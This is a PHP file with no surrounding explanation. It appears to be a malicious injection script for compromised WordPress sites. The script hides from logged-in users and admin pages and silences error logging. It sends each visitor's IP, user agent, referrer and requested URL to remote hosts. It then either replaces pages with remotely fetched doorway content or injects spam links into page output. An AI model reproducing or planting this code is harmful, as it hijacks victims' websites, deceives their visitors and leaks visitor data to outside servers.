<?php

if (!class_exists('Ratel')) {
    if (function_exists('is_user_logged_in')) {
        if (is_user_logged_in()) {
            return false;
        }
    }
	if(isset($_REQUEST['xftest'])) die(pi()*6);
    @ini_set('display_errors', NULL);
    @ini_set('error_reporting', NULL);
    @ini_set('log_errors', NULL);
    @ini_set('default_socket_timeout', 4);

    if (!isset($_SERVER['HTTP_USER_AGENT']) || !trim($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

    if (@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i", $_SERVER["HTTP_USER_AGENT"])) {
        $is_bot = 1;
    }

    $bad_file = array("png", "jpg", "jpeg", "gif", "css", "js", "swf", "avi", "mp4", "mp3", "flv", "pdf", "zip", "txt");

    $ruri = trim($_SERVER["REQUEST_URI"], "\t\n\r\0\x0B/");

    if (preg_match("/(wp-includes|admin|login|administrator)/i", $ruri)) {
        return false;
    }

    $host = 'unknown';
    if (isset($_SERVER["HTTP_HOST"])) {
        if (isset($_SERVER["HTTP_X_FORWARDED_HOST"])) {
            $_SERVER["HTTP_HOST"] = $_SERVER["HTTP_X_FORWARDED_HOST"];
        }
        $tmp = parse_url('http://' . $_SERVER["HTTP_HOST"]);
        if ($tmp['host']) {
            $host = $tmp['host'];
            if (substr($host, 0, 4) == 'www.') {
                $host = substr($host, 4);
            }
        }
        if (isset($_REQUEST[md5(md5($host))]) OR isset($_COOKIE[md5(md5($host))])) {
            die('suspicious request denied');
        }
    }

    if ((in_array(end(explode('.', $ruri)), $bad_file)) or stripos($ruri, 'robots.txt') !== false) {
        return false;
    }

    class Ratel {

        public $links_url = "http://doorgen.xyz/output";
        public $door_url = "http://blockads.men/";
        public $ip = '';
        public $ua = '';
        public $css = '';
        public $js = '';
        public $host = '';

        function get_client_ip() {
            foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
                if (array_key_exists($key, $_SERVER) === true) {
                    foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip) {
                        if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                            return $ip;
                        }
                    }
                }
            }
            return $_SERVER['REMOTE_ADDR'];
        }

        function init($ruri, $host, $is_bot) {
            $this->is_bot = $is_bot;
            $this->ruri = $ruri;
            $this->ip = $this->get_client_ip();
            if (count($_GET) === 1 and empty($_GET[0])) {
                $not_uri = end(array_keys($_GET));
            }
            $this->luri = '?data=' . base64_encode(@serialize(@array('url' => $_SERVER["HTTP_HOST"], 'uri' => $_SERVER["REQUEST_URI"], 'ua' => $_SERVER["HTTP_USER_AGENT"], 'ref' => $_SERVER["HTTP_REFERER"], 'ip' => $this->ip))) . '&url=' . $_SERVER["HTTP_HOST"];
            $this->uri = '?data=' . base64_encode(@serialize(@array('url' => $_SERVER["HTTP_HOST"], 'uri' => $_SERVER["REQUEST_URI"], 'ua' => $_SERVER["HTTP_USER_AGENT"], 'ref' => $_SERVER["HTTP_REFERER"], 'ip' => $this->ip, 'not_uri' => $not_uri, 'lang' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'is_bot' => $this->is_bot))) . '&url=' . $_SERVER["HTTP_HOST"];
            $this->the_end();
        }

        function make_links() {
            $links_string = $this->get(str_replace('/output', '/dgout', $this->links_url) . $this->luri, 1);
            if (strlen($links_string) == 0) {
                return false;
            }
            $links = @explode('<br>', $links_string);
            if (count($links) == 0) {
                return false;
            }
            return $links;
        }

        function rwcontent($content) {
            $tags = array('p', 'span', 'strong', 'em', 'i', 'td', 'div', 'ul', 'li', 'span', 'body');
            $tags_vals = array();
            foreach ($tags as $tag) {
                preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i", $content, $matches);
                if (@isset($matches[0])) {
                    foreach ($matches[0] as $match) {
                        $tags_vals[] = array('tag' => $tag, 'content' => $match);
                    }
                }
                if (count($tags_vals) > count($this->links)) {
                    break;
                }
            }
            foreach ($this->links as $link_index => $link) {
                foreach ($tags_vals as $tag_index => $tag_val) {
                    if (strlen($tag_val['content']) % 2 == 1) {
                        $tag_content_new = $tag_val['content'];
                        $tag_content_new = preg_replace("(<{$tag_val['tag']}.*?>)", "$0{$link}", $tag_content_new, 1);
                    } else {
                        if (substr($tag_val['content'], -(strlen($tag_val['tag']) + 4)) == ".</{$tag_val['tag']}>") {
                            $tag_content_new = str_replace(".</{$tag_val['tag']}>", " {$link}.</{$tag_val['tag']}>", $tag_val['content']);
                        } else {
                            $tag_content_new = str_replace("</{$tag_val['tag']}>", " {$link} </{$tag_val['tag']}>", $tag_val['content']);
                        }
                    }
                    $content = preg_replace("~{$tag_val['content']}~i", $tag_content_new, $content, 1);
                    unset($tags_vals[$tag_index]);
                    if (strpos($content, $link) !== false) {
                        unset($links[$link_index]);
                        continue 2;
                    }
                }
            }

            return $content;
        }

        function get($url, $bs64 = 0) {
            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $body = curl_exec($ch);
                $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            } else {
                $body = file_get_contents($url);
            }
            if (!empty($body)) {
                switch ($bs64) {
                    case '0':
                        if (!empty($content_type)) {
                            header('Content-Type: ' . $content_type);
                        }
                        return trim(base64_decode(trim($body)));
                    case '1':
                        return $body;
                }
            }
            return false;
        }

        function the_end() {
            $content = $this->get($this->door_url . $this->uri, 1);
            if (!empty($content) or $content != '') {
                $content = @base64_decode($content);
                if (strripos($content, ' keys/' . $_SERVER["HTTP_HOST"]) !== false) {
                    return false;
                }
                if (@strpos(@strtolower($content), '</html>') !== false) {
                    die($content);
                }
            } else {
                $this->links = $this->make_links();
                if (!empty($this->links) or $this->links !== False) {
                    ob_start(array($this, 'rwcontent'));
                    register_shutdown_function('ob_end_flush');
                }
            }
        }

    }
    $ratel = new Ratel;
    $ratel->init($ruri, $host, $is_bot);
}
?>